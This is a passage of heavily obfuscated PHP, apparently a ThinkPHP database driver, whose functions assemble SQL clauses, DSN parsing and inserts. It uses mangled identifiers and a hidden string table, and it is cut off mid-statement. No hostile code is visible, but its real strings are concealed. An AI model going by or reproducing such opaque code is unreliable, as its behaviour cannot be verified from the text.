$B„âºïÊä’[$A±—Ä†Æ·[876]], $A±—Ä†Æ·[793] => $B„âºïÊä’[$A±—Ä†Æ·[877]], $A±—Ä†Æ·[794] => $B„âºïÊä’[$A±—Ä†Æ·[878]], $A±—Ä†Æ·[17] => $B„âºïÊä’[$A±—Ä†Æ·[879]], $A±—Ä†Æ·[822] => $B„âºïÊä’[$A±—Ä†Æ·[720]], $A±—Ä†Æ·[13] => isset($B„âºïÊä’[$A±—Ä†Æ·[880]]) ? $B„âºïÊä’[$A±—Ä†Æ·[880]] : array()); } elseif (empty($B„âºïÊä’)) { if (think_config($A±—Ä†Æ·[881]) && $A±—Ä†Æ·[719] != strtolower(think_config($A±—Ä†Æ·[882]))) { $B„âºïÊä’ = $this->parseDSN(think_config($A±—Ä†Æ·[881])); } else { $B„âºïÊä’ = array($A±—Ä†Æ·[870] => think_config($A±—Ä†Æ·[882]), $A±—Ä†Æ·[795] => think_config($A±—Ä†Æ·[883]), $A±—Ä†Æ·[796] => think_config($A±—Ä†Æ·[884]), $A±—Ä†Æ·[793] => think_config($A±—Ä†Æ·[885]), $A±—Ä†Æ·[794] => think_config($A±—Ä†Æ·[886]), $A±—Ä†Æ·[17] => think_config($A±—Ä†Æ·[231]), $A±—Ä†Æ·[822] => think_config($A±—Ä†Æ·[881]), $A±—Ä†Æ·[13] => think_config($A±—Ä†Æ·[887])); } } return $B„âºïÊä’; } protected function initConnect($AØİ¬†Á = true) { if (1 == think_config($_SERVER[ÚŠ•´ÍéÒÑÔ][18])) { $this->_linkID = $this->multiConnect($AØİ¬†Á); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($EØ—ãˆ¢¢ = false) { $dßÑêìˆËå =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; static $dÒ£”ãêö± = array(); if (empty($dÒ£”ãêö±)) { foreach ($this->config as $cğ³ »ìô³ => $aîÃØ©Íîª) { $dÒ£”ãêö±[$cğ³ »ìô³] = explode($dßÑêìˆËå[47], $aîÃØ©Íîª); } } if (think_config($dßÑêìˆËå[888])) { if ($EØ—ãˆ¢¢) { $A×Şö ¶‹³ = floor(mt_rand(0, think_config($dßÑêìˆËå[889]) - 1)); } else { if (is_numeric(think_config($dßÑêìˆËå[890]))) { $A×Şö ¶‹³ = think_config($dßÑêìˆËå[890]); } else { $A×Şö ¶‹³ = floor(mt_rand(think_config($dßÑêìˆËå[889]), count($dÒ£”ãêö±[$dßÑêìˆËå[793]]) - 1)); } } } else { $A×Şö ¶‹³ = floor(mt_rand(0, count($dÒ£”ãêö±[$dßÑêìˆËå[793]]) - 1)); } $A‚‹ÁŸ ¬‹ = array($dßÑêìˆËå[795] => isset($dÒ£”ãêö±[$dßÑêìˆËå[795]][$A×Şö ¶‹³]) ? $dÒ£”ãêö±[$dßÑêìˆËå[795]][$A×Şö ¶‹³] : $dÒ£”ãêö±[$dßÑêìˆËå[795]][0], $dßÑêìˆËå[796] => isset($dÒ£”ãêö±[$dßÑêìˆËå[796]][$A×Şö ¶‹³]) ? $dÒ£”ãêö±[$dßÑêìˆËå[796]][$A×Şö ¶‹³] : $dÒ£”ãêö±[$dßÑêìˆËå[796]][0], $dßÑêìˆËå[793] => isset($dÒ£”ãêö±[$dßÑêìˆËå[793]][$A×Şö ¶‹³]) ? $dÒ£”ãêö±[$dßÑêìˆËå[793]][$A×Şö ¶‹³] : $dÒ£”ãêö±[$dßÑêìˆËå[793]][0], $dßÑêìˆËå[794] => isset($dÒ£”ãêö±[$dßÑêìˆËå[794]][$A×Şö ¶‹³]) ? $dÒ£”ãêö±[$dßÑêìˆËå[794]][$A×Şö ¶‹³] : $dÒ£”ãêö±[$dßÑêìˆËå[794]][0], $dßÑêìˆËå[17] => isset($dÒ£”ãêö±[$dßÑêìˆËå[17]][$A×Şö ¶‹³]) ? $dÒ£”ãêö±[$dßÑêìˆËå[17]][$A×Şö ¶‹³] : $dÒ£”ãêö±[$dßÑêìˆËå[17]][0], $dßÑêìˆËå[822] => isset($dÒ£”ãêö±[$dßÑêìˆËå[822]][$A×Şö ¶‹³]) ? $dÒ£”ãêö±[$dßÑêìˆËå[822]][$A×Şö ¶‹³] : $dÒ£”ãêö±[$dßÑêìˆËå[822]][0], $dßÑêìˆËå[13] => isset($dÒ£”ãêö±[$dßÑêìˆËå[13]][$A×Şö ¶‹³]) ? $dÒ£”ãêö±[$dßÑêìˆËå[13]][$A×Şö ¶‹³] : $dÒ£”ãêö±[$dßÑêìˆËå[13]][0]); return $this->connect($A‚‹ÁŸ ¬‹, $A×Şö ¶‹³); } public function parseDSN($FÏí—¶Ô£ò) { $e·ˆĞ›±­ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (empty($FÏí—¶Ô£ò)) { return !1; } $C‘õ®È× = parse_url($FÏí—¶Ô£ò); if ($C‘õ®È×[$e·ˆĞ›±­[165]]) { $eğÛ…ç¿Ñ† = array($e·ˆĞ›±­[870] => $C‘õ®È×[$e·ˆĞ›±­[165]], $e·ˆĞ›±­[795] => isset($C‘õ®È×[$e·ˆĞ›±­[531]]) ? $C‘õ®È×[$e·ˆĞ›±­[531]] : $e·ˆĞ›±­[33], $e·ˆĞ›±­[796] => isset($C‘õ®È×[$e·ˆĞ›±­[891]]) ? $C‘õ®È×[$e·ˆĞ›±­[891]] : $e·ˆĞ›±­[33], $e·ˆĞ›±­[793] => isset($C‘õ®È×[$e·ˆĞ›±­[166]]) ? $C‘õ®È×[$e·ˆĞ›±­[166]] : $e·ˆĞ›±­[33], $e·ˆĞ›±­[794] => isset($C‘õ®È×[$e·ˆĞ›±­[167]]) ? $C‘õ®È×[$e·ˆĞ›±­[167]] : $e·ˆĞ›±­[33], $e·ˆĞ›±­[17] => isset($C‘õ®È×[$e·ˆĞ›±­[75]]) ? substr($C‘õ®È×[$e·ˆĞ›±­[75]], 1) : $e·ˆĞ›±­[33]); } else { preg_match($e·ˆĞ›±­[892], trim($FÏí—¶Ô£ò), $b‰‰¬ñíù°); $eğÛ…ç¿Ñ† = array($e·ˆĞ›±­[870] => $b‰‰¬ñíù°[1], $e·ˆĞ›±­[795] => $b‰‰¬ñíù°[2], $e·ˆĞ›±­[796] => $b‰‰¬ñíù°[3], $e·ˆĞ›±­[793] => $b‰‰¬ñíù°[4], $e·ˆĞ›±­[794] => $b‰‰¬ñíù°[5], $e·ˆĞ›±­[17] => $b‰‰¬ñíù°[6]); } $eğÛ…ç¿Ñ†[$e·ˆĞ›±­[822]] = $e·ˆĞ›±­[33]; return $eğÛ…ç¿Ñ†; } protected function debug() { $bÊ„‰áÊ¤ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $bÊ„‰áÊ¤[893]; if (think_config($bÊ„‰áÊ¤[894])) { think_status($bÊ„‰áÊ¤[895]); think_trace($this->queryStr . $bÊ„‰áÊ¤[896] . think_status($bÊ„‰áÊ¤[20], $bÊ„‰áÊ¤[895], 6) . $bÊ„‰áÊ¤[897], $bÊ„‰áÊ¤[33], $bÊ„‰áÊ¤[898]); } } protected function parseLock($b„ ¤”¹Ö = false) { $C±‹Ÿ´ÇÜ‘ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$b„ ¤”¹Ö) { return $C±‹Ÿ´ÇÜ‘[33]; } if ($C±‹Ÿ´ÇÜ‘[824] == $this->dbType) { return $C±‹Ÿ´ÇÜ‘[899]; } return $C±‹Ÿ´ÇÜ‘[900]; } protected function parseSet($EªéÍ¢åÁÉ) { $eÅ¦İµœÛ¤ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; foreach ($EªéÍ¢åÁÉ as $DÒ÷½–êè => $Bª£‰‰§¼•) { if (is_array($Bª£‰‰§¼•) && $eÅ¦İµœÛ¤[282] == $Bª£‰‰§¼•[0]) { $f½¥£ç°—á[] = $this->parseKey($DÒ÷½–êè) . $eÅ¦İµœÛ¤[901] . $Bª£‰‰§¼•[1]; } elseif (is_scalar($Bª£‰‰§¼•) || is_null($Bª£‰‰§¼•)) { $f½¥£ç°—á[] = $this->parseKey($DÒ÷½–êè) . $eÅ¦İµœÛ¤[901] . $this->parseValue($Bª£‰‰§¼•); } } return $eÅ¦İµœÛ¤[902] . implode($eÅ¦İµœÛ¤[47], $f½¥£ç°—á); } protected function bindParam($bâ“åå·œ, $e«”¶›ËÄ) { $this->bind[$_SERVER[ÚŠ•´ÍéÒÑÔ][4] . $bâ“åå·œ] = $e«”¶›ËÄ; } protected function parseBind($aõÌ½ÅÄÊ) { $aõÌ½ÅÄÊ = array_merge($this->bind, $aõÌ½ÅÄÊ); $this->bind = array(); return $aõÌ½ÅÄÊ; } function parseKey(&$A„…ƒƒ†¯©, $fòˆŒİó–† = true) { if ($fòˆŒİó–†) { $A„…ƒƒ†¯© = $this->parseKeyCheck($A„…ƒƒ†¯©); } return $A„…ƒƒ†¯©; } function parseKeyCheck($fÆñœëù—Û) { $DÖ‘––± =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fÆñœëù—Û = trim($fÆñœëù—Û); if (!preg_match($DÖ‘––±[903], $fÆñœëù—Û)) { think_exception($DÖ‘––±[904] . $fÆñœëù—Û); } return $fÆñœëù—Û; } protected function parseValue($AˆéÖ©ˆÏ¯) { $b•ˆØŸöç» =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (is_string($AˆéÖ©ˆÏ¯)) { $AˆéÖ©ˆÏ¯ = $b•ˆØŸöç»[863] . $this->escapeString($AˆéÖ©ˆÏ¯) . $b•ˆØŸöç»[863]; } elseif (isset($AˆéÖ©ˆÏ¯[0]) && is_string($AˆéÖ©ˆÏ¯[0]) && strtolower($AˆéÖ©ˆÏ¯[0]) == $b•ˆØŸöç»[282]) { $AˆéÖ©ˆÏ¯ = $this->escapeString($AˆéÖ©ˆÏ¯[1]); } elseif (is_array($AˆéÖ©ˆÏ¯)) { $AˆéÖ©ˆÏ¯ = array_map(array($this, $b•ˆØŸöç»[864]), $AˆéÖ©ˆÏ¯); } elseif (is_bool($AˆéÖ©ˆÏ¯)) { $AˆéÖ©ˆÏ¯ = $AˆéÖ©ˆÏ¯ ? $b•ˆØŸöç»[83] : $b•ˆØŸöç»[464]; } elseif (is_null($AˆéÖ©ˆÏ¯)) { $AˆéÖ©ˆÏ¯ = $b•ˆØŸöç»[101]; } return $AˆéÖ©ˆÏ¯; } protected function parseField($Aö«„º) { $A¦¡µ‚¥Ş­ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (is_string($Aö«„º) && strpos($Aö«„º, $A¦¡µ‚¥Ş­[47])) { $Aö«„º = explode($A¦¡µ‚¥Ş­[47], $Aö«„º); } if (is_array($Aö«„º)) { $cÚÛ¼‘ŒôÆ = array(); foreach ($Aö«„º as $C¢íÂ¶…¦ => $FìÄÀö¢·) { if (!is_numeric($C¢íÂ¶…¦)) { $cÚÛ¼‘ŒôÆ[] = $this->parseKey($C¢íÂ¶…¦) . $A¦¡µ‚¥Ş­[905] . $this->parseKey($FìÄÀö¢·); } else { $cÚÛ¼‘ŒôÆ[] = $this->parseKey($FìÄÀö¢·); } } $a§é¿ñïö = implode($A¦¡µ‚¥Ş­[47], $cÚÛ¼‘ŒôÆ); } elseif (is_string($Aö«„º) && !empty($Aö«„º)) { $a§é¿ñïö = $Aö«„º; } else { $a§é¿ñïö = $A¦¡µ‚¥Ş­[173]; } return $a§é¿ñïö; } protected function parseTable($a„ãÙÛ«º˜) { $F÷¹Ğ–ÆÊ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (is_array($a„ãÙÛ«º˜)) { $eÂƒßÑ¢ä¢ = array(); foreach ($a„ãÙÛ«º˜ as $Fßî“Æ™Ş => $bÛõÀêÄ–½) { if (!is_numeric($Fßî“Æ™Ş)) { $eÂƒßÑ¢ä¢[] = $this->parseKey($Fßî“Æ™Ş) . $F÷¹Ğ–ÆÊ[50] . $this->parseKey($bÛõÀêÄ–½); } else { $eÂƒßÑ¢ä¢[] = $this->parseKey($Fßî“Æ™Ş); } } $a„ãÙÛ«º˜ = $eÂƒßÑ¢ä¢; } elseif (is_string($a„ãÙÛ«º˜)) { if (strstr($a„ãÙÛ«º˜, $F÷¹Ğ–ÆÊ[50])) { return $a„ãÙÛ«º˜; } $a„ãÙÛ«º˜ = explode($F÷¹Ğ–ÆÊ[47], $a„ãÙÛ«º˜); array_walk($a„ãÙÛ«º˜, array($this, $F÷¹Ğ–ÆÊ[812])); } return $F÷¹Ğ–ÆÊ[906] . trim(implode($F÷¹Ğ–ÆÊ[907], $a„ãÙÛ«º˜), $F÷¹Ğ–ÆÊ[818]) . $F÷¹Ğ–ÆÊ[906]; } protected function parseWhere($eÜ³†õåŒ®) { $f¥×İí®Âç =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $C—¢¿‘˜ô = $f¥×İí®Âç[33]; if (is_string($eÜ³†õåŒ®)) { $C—¢¿‘˜ô = $eÜ³†õåŒ®; } else { $dİÍÀñß‚¯ = isset($eÜ³†õåŒ®[$f¥×İí®Âç[908]]) ? strtoupper($eÜ³†õåŒ®[$f¥×İí®Âç[908]]) : $f¥×İí®Âç[33]; if (in_array($dİÍÀñß‚¯, array($f¥×İí®Âç[909], $f¥×İí®Âç[910], $f¥×İí®Âç[911]))) { $dİÍÀñß‚¯ = $f¥×İí®Âç[50] . $dİÍÀñß‚¯ . $f¥×İí®Âç[50]; unset($eÜ³†õåŒ®[$f¥×İí®Âç[908]]); } else { $dİÍÀñß‚¯ = $f¥×İí®Âç[912]; } foreach ($eÜ³†õåŒ® as $e¸å¶Êô™ë => $cƒÎÜñÛóÑ) { $C—¢¿‘˜ô .= $f¥×İí®Âç[262]; if (is_numeric($e¸å¶Êô™ë)) { $e¸å¶Êô™ë = $f¥×İí®Âç[913]; } if (0 === strpos($e¸å¶Êô™ë, $f¥×İí®Âç[70])) { $C—¢¿‘˜ô .= $this->parseThinkWhere($e¸å¶Êô™ë, $cƒÎÜñÛóÑ); } else { if (!preg_match($f¥×İí®Âç[914], trim($e¸å¶Êô™ë))) { think_exception(think_lang($f¥×İí®Âç[915]) . $f¥×İí®Âç[4] . $e¸å¶Êô™ë); } $a¹—Ã„áçˆ = is_array($cƒÎÜñÛóÑ) && isset($cƒÎÜñÛóÑ[$f¥×İí®Âç[916]]); $e¸å¶Êô™ë = trim($e¸å¶Êô™ë); if (strpos($e¸å¶Êô™ë, $f¥×İí®Âç[268])) { $B´˜™Ã˜Ñˆ = explode($f¥×İí®Âç[268], $e¸å¶Êô™ë); $F‘Şëª¾­ = array(); foreach ($B´˜™Ã˜Ñˆ as $c±ŒÅ¢•Áæ => $EÇ•·¤ƒ¡) { $c¬œÁ¼Û™‚ = $a¹—Ã„áçˆ ? $cƒÎÜñÛóÑ[$c±ŒÅ¢•Áæ] : $cƒÎÜñÛóÑ; $F‘Şëª¾­[] = $f¥×İí®Âç[245] . $this->parseWhereItem($this->parseKey($EÇ•·¤ƒ¡), $c¬œÁ¼Û™‚) . $f¥×İí®Âç[811]; } $C—¢¿‘˜ô .= implode($f¥×İí®Âç[917], $F‘Şëª¾­); } elseif (strpos($e¸å¶Êô™ë, $f¥×İí®Âç[269])) { $B´˜™Ã˜Ñˆ = explode($f¥×İí®Âç[269], $e¸å¶Êô™ë); $F‘Şëª¾­ = array(); foreach ($B´˜™Ã˜Ñˆ as $c±ŒÅ¢•Áæ => $EÇ•·¤ƒ¡) { $c¬œÁ¼Û™‚ = $a¹—Ã„áçˆ ? $cƒÎÜñÛóÑ[$c±ŒÅ¢•Áæ] : $cƒÎÜñÛóÑ; $F‘Şëª¾­[] = $f¥×İí®Âç[245] . $this->parseWhereItem($this->parseKey($EÇ•·¤ƒ¡), $c¬œÁ¼Û™‚) . $f¥×İí®Âç[811]; } $C—¢¿‘˜ô .= implode($f¥×İí®Âç[912], $F‘Şëª¾­); } else { $C—¢¿‘˜ô .= $this->parseWhereItem($this->parseKey($e¸å¶Êô™ë), $cƒÎÜñÛóÑ); } } $C—¢¿‘˜ô .= $f¥×İí®Âç[263] . $dİÍÀñß‚¯; } $C—¢¿‘˜ô = substr($C—¢¿‘˜ô, 0, -strlen($dİÍÀñß‚¯)); } return empty($C—¢¿‘˜ô) ? $f¥×İí®Âç[33] : $f¥×İí®Âç[918] . $C—¢¿‘˜ô; } protected function parseWhereItem($FìÁï”åèî, $cˆ­È•ëÂå) { $A×‘‘¦˜š© =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $A‹°¿ßä£ = $A×‘‘¦˜š©[33]; if (is_array($cˆ­È•ëÂå)) { if (is_string($cˆ­È•ëÂå[0])) { $aô²âíª—ò = strtolower($cˆ­È•ëÂå[0]); if (in_array($cˆ­È•ëÂå[0], array($A×‘‘¦˜š©[901], $A×‘‘¦˜š©[919], $A×‘‘¦˜š©[920], $A×‘‘¦˜š©[921], $A×‘‘¦˜š©[922], $A×‘‘¦˜š©[923]))) { $A‹°¿ßä£ .= $FìÁï”åèî . $A×‘‘¦˜š©[50] . $cˆ­È•ëÂå[0] . $A×‘‘¦˜š©[50] . $this->parseValue($cˆ­È•ëÂå[1]); } elseif (preg_match($A×‘‘¦˜š©[924], $cˆ­È•ëÂå[0])) { $A‹°¿ßä£ .= $FìÁï”åèî . $A×‘‘¦˜š©[50] . $this->exp[$aô²âíª—ò] . $A×‘‘¦˜š©[50] . $this->parseValue($cˆ­È•ëÂå[1]); } elseif (preg_match($A×‘‘¦˜š©[925], $cˆ­È•ëÂå[0])) { if (is_array($cˆ­È•ëÂå[1])) { $F¬£™«Á¾ = isset($cˆ­È•ëÂå[2]) ? strtoupper($cˆ­È•ëÂå[2]) : $A×‘‘¦˜š©[910]; if (in_array($F¬£™«Á¾, array($A×‘‘¦˜š©[909], $A×‘‘¦˜š©[910], $A×‘‘¦˜š©[911]))) { $f¤ÂìÔ¯ÌÕ = array(); foreach ($cˆ­È•ëÂå[1] as $CÌ«öê‡æ) { $f¤ÂìÔ¯ÌÕ[] = $FìÁï”åèî . $A×‘‘¦˜š©[50] . $this->exp[$aô²âíª—ò] . $A×‘‘¦˜š©[50] . $this->parseValue($CÌ«öê‡æ); } $A‹°¿ßä£ .= $A×‘‘¦˜š©[245] . implode($A×‘‘¦˜š©[50] . $F¬£™«Á¾ . $A×‘‘¦˜š©[50], $f¤ÂìÔ¯ÌÕ) . $A×‘‘¦˜š©[811]; } } else { $A‹°¿ßä£ .= $FìÁï”åèî . $A×‘‘¦˜š©[50] . $this->exp[$aô²âíª—ò] . $A×‘‘¦˜š©[50] . $this->parseValue($cˆ­È•ëÂå[1]); } } elseif ($A×‘‘¦˜š©[282] == $aô²âíª—ò) { $A‹°¿ßä£ .= $A×‘‘¦˜š©[809] . $FìÁï”åèî . $A×‘‘¦˜š©[50] . $cˆ­È•ëÂå[1] . $A×‘‘¦˜š©[926]; } elseif (preg_match($A×‘‘¦˜š©[927], $cˆ­È•ëÂå[0])) { if (isset($cˆ­È•ëÂå[2]) && $A×‘‘¦˜š©[282] == $cˆ­È•ëÂå[2]) { $A‹°¿ßä£ .= $FìÁï”åèî . $A×‘‘¦˜š©[50] . $this->exp[$aô²âíª—ò] . $A×‘‘¦˜š©[50] . $cˆ­È•ëÂå[1]; } else { if (is_string($cˆ­È•ëÂå[1])) { $cˆ­È•ëÂå[1] = explode($A×‘‘¦˜š©[47], $cˆ­È•ëÂå[1]); } $E‡ˆó“¦¡¦ = implode($A×‘‘¦˜š©[47], $this->parseValue($cˆ­È•ëÂå[1])); $A‹°¿ßä£ .= $FìÁï”åèî . $A×‘‘¦˜š©[50] . $this->exp[$aô²âíª—ò] . $A×‘‘¦˜š©[809] . $E‡ˆó“¦¡¦ . $A×‘‘¦˜š©[811]; } } elseif (preg_match($A×‘‘¦˜š©[928], $cˆ­È•ëÂå[0])) { $E¬Éëì³É‰ = is_string($cˆ­È•ëÂå[1]) ? explode($A×‘‘¦˜š©[47], $cˆ­È•ëÂå[1]) : $cˆ­È•ëÂå[1]; $A‹°¿ßä£ .= $A×‘‘¦˜š©[809] . $FìÁï”åèî . $A×‘‘¦˜š©[50] . $this->exp[$aô²âíª—ò] . $A×‘‘¦˜š©[50] . $this->parseValue($E¬Éëì³É‰[0]) . $A×‘‘¦˜š©[912] . $this->parseValue($E¬Éëì³É‰[1]) . $A×‘‘¦˜š©[263]; } else { think_exception(think_lang($A×‘‘¦˜š©[915]) . $A×‘‘¦˜š©[4] . $cˆ­È•ëÂå[0]); } } else { $fà‹ê„ƒ¬Ì = count($cˆ­È•ëÂå); $FµÃ‡ÂÔÚĞ = isset($cˆ­È•ëÂå[$fà‹ê„ƒ¬Ì - 1]) ? strtoupper($cˆ­È•ëÂå[$fà‹ê„ƒ¬Ì - 1]) : $A×‘‘¦˜š©[33]; if (in_array($FµÃ‡ÂÔÚĞ, array($A×‘‘¦˜š©[909], $A×‘‘¦˜š©[910], $A×‘‘¦˜š©[911]))) { $fà‹ê„ƒ¬Ì = $fà‹ê„ƒ¬Ì - 1; } else { $FµÃ‡ÂÔÚĞ = $A×‘‘¦˜š©[909]; } for ($aÔ˜ç¦®œÈ = 0; $aÔ˜ç¦®œÈ < $fà‹ê„ƒ¬Ì; $aÔ˜ç¦®œÈ++) { $E¬Éëì³É‰ = is_array($cˆ­È•ëÂå[$aÔ˜ç¦®œÈ]) ? $cˆ­È•ëÂå[$aÔ˜ç¦®œÈ][1] : $cˆ­È•ëÂå[$aÔ˜ç¦®œÈ]; if ($A×‘‘¦˜š©[282] == strtolower($cˆ­È•ëÂå[$aÔ˜ç¦®œÈ][0])) { $A‹°¿ßä£ .= $A×‘‘¦˜š©[245] . $FìÁï”åèî . $A×‘‘¦˜š©[50] . $E¬Éëì³É‰ . $A×‘‘¦˜š©[926] . $FµÃ‡ÂÔÚĞ . $A×‘‘¦˜š©[50]; } else { $cÜÓ÷’Íëò = is_array($cˆ­È•ëÂå[$aÔ˜ç¦®œÈ]) ? $this->exp[strtolower($cˆ­È•ëÂå[$aÔ˜ç¦®œÈ][0])] : $A×‘‘¦˜š©[901]; if (!$cÜÓ÷’Íëò && is_array($cˆ­È•ëÂå[$aÔ˜ç¦®œÈ]) && in_array($cˆ­È•ëÂå[$aÔ˜ç¦®œÈ][0], array($A×‘‘¦˜š©[901], $A×‘‘¦˜š©[919], $A×‘‘¦˜š©[920], $A×‘‘¦˜š©[921], $A×‘‘¦˜š©[922], $A×‘‘¦˜š©[923]))) { $cÜÓ÷’Íëò = $cˆ­È•ëÂå[$aÔ˜ç¦®œÈ][0]; } $A‹°¿ßä£ .= $A×‘‘¦˜š©[245] . $FìÁï”åèî . $A×‘‘¦˜š©[50] . $cÜÓ÷’Íëò . $A×‘‘¦˜š©[50] . $this->parseValue($E¬Éëì³É‰) . $A×‘‘¦˜š©[926] . $FµÃ‡ÂÔÚĞ . $A×‘‘¦˜š©[50]; } } $A‹°¿ßä£ = substr($A‹°¿ßä£, 0, -4); } } else { $A‹°¿ßä£ .= $FìÁï”åèî . $A×‘‘¦˜š©[929] . $this->parseValue($cˆ­È•ëÂå); } return $A‹°¿ßä£; } protected function parseThinkWhere($f—ßÎ”ßŠî, $bŒ¦ Šäò) { $aâŞ•æŠİ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $aÂÓÇ²ÔË— = $aâŞ•æŠİ[33]; switch ($f—ßÎ”ßŠî) { case $aâŞ•æŠİ[336]: $aÂÓÇ²ÔË— = $bŒ¦ Šäò; break; case $aâŞ•æŠİ[913]: $aÂÓÇ²ÔË— = is_string($bŒ¦ Šäò) ? $bŒ¦ Šäò : substr($this->parseWhere($bŒ¦ Šäò), 6); break; case $aâŞ•æŠİ[930]: parse_str($bŒ¦ Šäò, $bµóÂÎ™Á); if (isset($bµóÂÎ™Á[$aâŞ•æŠİ[908]])) { $DïóÖÈÕ› = $aâŞ•æŠİ[50] . strtoupper($bµóÂÎ™Á[$aâŞ•æŠİ[908]]) . $aâŞ•æŠİ[50]; unset($bµóÂÎ™Á[$aâŞ•æŠİ[908]]); } else { $DïóÖÈÕ› = $aâŞ•æŠİ[912]; } $FÒ¸ ¶–Ë = array(); foreach ($bµóÂÎ™Á as $BîéñæîøŸ => $D¬¬ßŸ‹œ¦) { $FÒ¸ ¶–Ë[] = $this->parseKey($BîéñæîøŸ) . $aâŞ•æŠİ[929] . $this->parseValue($D¬¬ßŸ‹œ¦); } $aÂÓÇ²ÔË— = implode($DïóÖÈÕ›, $FÒ¸ ¶–Ë); break; } return $aÂÓÇ²ÔË—; } protected function parseLimit($BÎèùÃ™”) { $d‰èš‰Á¶Â =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; return !empty($BÎèùÃ™”) ? $d‰èš‰Á¶Â[48] . $BÎèùÃ™” . $d‰èš‰Á¶Â[50] : $d‰èš‰Á¶Â[33]; } protected function parseJoin($f„‘ù‡«‡½) { $E…œíİÖ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $A¡”ÃŞ¬Œ = $E…œíİÖ[33]; if (!empty($f„‘ù‡«‡½)) { if (is_array($f„‘ù‡«‡½)) { foreach ($f„‘ù‡«‡½ as $B‡ªèœ÷ƒ¿ => $D¸ŠâÛÜ¾) { if (!1 !== stripos($D¸ŠâÛÜ¾, $E…œíİÖ[931])) { $A¡”ÃŞ¬Œ .= $E…œíİÖ[50] . $D¸ŠâÛÜ¾; } else { $A¡”ÃŞ¬Œ .= $E…œíİÖ[932] . $D¸ŠâÛÜ¾; } } } else { $A¡”ÃŞ¬Œ .= $E…œíİÖ[932] . $f„‘ù‡«‡½; } } $A¡”ÃŞ¬Œ = preg_replace($E…œíİÖ[933], think_config($E…œíİÖ[836]) . $E…œíİÖ[934], $A¡”ÃŞ¬Œ); return $A¡”ÃŞ¬Œ; } protected function parseOrder($aÎÜæÊ×) { $b÷ä¹æäÀ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (is_array($aÎÜæÊ×)) { $cÅ‘èÇš«Í = array(); foreach ($aÎÜæÊ× as $fÁ§˜ÏæÏ» => $BŒÈ“š‘–Ö) { if (is_numeric($fÁ§˜ÏæÏ»)) { $cÅ‘èÇš«Í[] = $this->parseKey($BŒÈ“š‘–Ö); } else { $BŒÈ“š‘–Ö = in_array(strtoupper(trim($BŒÈ“š‘–Ö)), array($b÷ä¹æäÀ[935], $b÷ä¹æäÀ[936])) ? $b÷ä¹æäÀ[50] . $BŒÈ“š‘–Ö : $b÷ä¹æäÀ[33]; if (preg_match($b÷ä¹æäÀ[937], $fÁ§˜ÏæÏ»)) { $cÅ‘èÇš«Í[] = $this->parseKey($fÁ§˜ÏæÏ») . $BŒÈ“š‘–Ö; } else { think_exception($b÷ä¹æäÀ[938] . $fÁ§˜ÏæÏ»); } } } $aÎÜæÊ× = implode($b÷ä¹æäÀ[47], $cÅ‘èÇš«Í); } return !empty($aÎÜæÊ×) ? $b÷ä¹æäÀ[939] . $aÎÜæÊ× : $b÷ä¹æäÀ[33]; } protected function parseGroup($f×¸æÛ…) { $E¡Ç°Û¾ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; return !empty($f×¸æÛ…) ? $E¡Ç°Û¾[940] . $f×¸æÛ… : $E¡Ç°Û¾[33]; } protected function parseHaving($Dï²†‚ù„Õ) { $cºÂÀï¼‘· =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; return !empty($Dï²†‚ù„Õ) ? $cºÂÀï¼‘·[941] . $Dï²†‚ù„Õ : $cºÂÀï¼‘·[33]; } protected function parseComment($Aù™Ã¢ ­) { $CÀ‚á‰êñ² =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; return !empty($Aù™Ã¢ ­) ? $CÀ‚á‰êñ²[942] . $Aù™Ã¢ ­ . $CÀ‚á‰êñ²[943] : $CÀ‚á‰êñ²[33]; } protected function parseDistinct($DÆ‘ÉÅËÁõ) { $F„Ì¢†•’Í =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; return !empty($DÆ‘ÉÅËÁõ) ? $F„Ì¢†•’Í[944] : $F„Ì¢†•’Í[33]; } protected function parseUnion($F‰§ñ½©) { $f‹¼œÂ¸àå =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (empty($F‰§ñ½©)) { return $f‹¼œÂ¸àå[33]; } if (isset($F‰§ñ½©[$f‹¼œÂ¸àå[333]])) { $cšÊ‰‚‹Œì = $f‹¼œÂ¸àå[945]; unset($F‰§ñ½©[$f‹¼œÂ¸àå[333]]); } else { $cšÊ‰‚‹Œì = $f‹¼œÂ¸àå[946]; } foreach ($F‰§ñ½© as $fœöÉƒ³èª) { $A°¸£âÎŒŠ[] = $cšÊ‰‚‹Œì . (is_array($fœöÉƒ³èª) ? $this->buildSelectSql($fœöÉƒ³èª) : $fœöÉƒ³èª); } return implode($f‹¼œÂ¸àå[50], $A°¸£âÎŒŠ); } public function insert($F¸ˆ¨Ç­‚Ï, $c³İÕ¡‡öÜ = array(), $f»©íí®• = false) { goto bÂ¢·æïÏ; f†ÌÄ‚Û¸¾: foreach ($F¸ˆ¨Ç­‚Ï as $a‡ëİÒ‹­ù => $EˆÛàé´’) { if (is_array($EˆÛàé´’) && $Aµ²²¾˜ğ†[282] == $EˆÛàé´’[0]) { $CÈí¦ğ–â[] = $this->parseKey($a‡ëİÒ‹­ù); $CâŞ‚¦éÕÉ[] = $EˆÛàé´’[1]; } elseif (is_scalar($EˆÛàé´’) || is_null($EˆÛàé´’)) { $CÈí¦ğ–â[] = $this->parseKey($a‡ëİÒ‹­ù); $CâŞ‚¦éÕÉ[] = $this->parseValue($EˆÛàé´’); } } $f¿Òã„‡ê = ($f»©íí®• ? $Aµ²²¾˜ğ†[813] : $Aµ²²¾˜ğ†[814]) . 